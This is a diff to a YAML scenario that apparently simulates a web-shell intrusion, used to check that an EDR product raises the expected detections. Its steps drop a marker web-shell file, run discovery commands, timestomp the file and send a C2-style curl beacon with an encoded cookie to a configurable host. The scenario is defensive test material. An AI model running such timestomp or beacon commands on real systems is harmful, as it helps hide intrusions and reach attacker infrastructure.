@@ -74,6 +74,19 @@ success_criteria: |
   alert is within the MTTD budget.
 moat_tier: "LEAD"
 
+# ── Causality contract ──────────────────────────────────────────────────────
+# The IIS worker w3wp.exe is the Causality Group Owner — the internet-facing
+# process that receives the web-shell request and OWNS the whole NET-STAR chain
+# in XDR's causality view — NOT the synthetic beacon. Everything that follows
+# (command lineage, reflective .NET load, AMSI/CLR co-load, timestomp, STAR
+# cookie C2) descends from that one w3wp.exe process instance, so the graph
+# collapses from a star-off-the-agent into one connected spine anchored on the
+# worker. primary_username is the app-pool identity (the harness runs it as
+# www-data on the Linux emulation host).
+cgo_anchor:
+  image_name: "w3wp.exe"
+  primary_username: "www-data"
+
 external_tools: []
 
 steps:
@@ -82,6 +95,7 @@ steps:
     command: "mkdir -p \"${WEBROOT:-/var/www/html}\"; printf '%s\\n' '<%-- CortexSim SAFE-MODE marker SIM-EDR-014 NET-STAR OutlookEN.aspx --%>' > \"${WEBROOT:-/var/www/html}/OutlookEN.aspx\"; echo cortexsim-edr-014-webshell-dropped"
     identity: www-data
     mitre_technique: "T1505.003"
+    platforms: ["windows"]
     expected_detections:
       - plane: EDR
         type: BIOC
@@ -99,6 +113,10 @@ steps:
     command: "whoami; hostname; id; echo cortexsim-edr-014-w3wp-command-lineage-and-reflective-load"
     identity: www-data
     mitre_technique: "T1620"
+    platforms: ["windows"]
+    causality:
+      parent_step: step-01
+      pivot: process_lineage
     expected_detections:
       - plane: EDR
         type: BIOC
@@ -126,6 +144,10 @@ steps:
     command: "touch -t 202001010000.00 \"${WEBROOT:-/var/www/html}/OutlookEN.aspx\" 2>/dev/null || true; echo cortexsim-edr-014-amsi-clr-coload-and-timestomp"
     identity: www-data
     mitre_technique: "T1562.001"
+    platforms: ["windows"]
+    causality:
+      parent_step: step-02
+      pivot: process_lineage
     expected_detections:
       - plane: EDR
         type: BIOC
@@ -143,6 +165,10 @@ steps:
     command: "curl -s --max-time 5 -H 'Cookie: sid=R2ppcA==STARQUJD==STARUEtDUzc=' \"http://${C2_HOST:-127.0.0.1}/owa/OutlookEN.aspx\" -o /dev/null 2>/dev/null || true; echo cortexsim-edr-014-star-cookie-c2"
     identity: www-data
     mitre_technique: "T1071.001"
+    platforms: ["windows"]
+    causality:
+      parent_step: step-02
+      pivot: network_session
     expected_detections:
       - plane: EDR
         type: XQL
@@ -155,6 +181,10 @@ steps:
     command: "echo cortexsim-edr-014-cr-edr-0014-stitched-net-star-incident"
     identity: www-data
     mitre_technique: "T1505.003"
+    platforms: ["windows"]
+    causality:
+      parent_step: step-04
+      pivot: shared_entity
     expected_detections:
       - plane: EDR
         type: Correlation
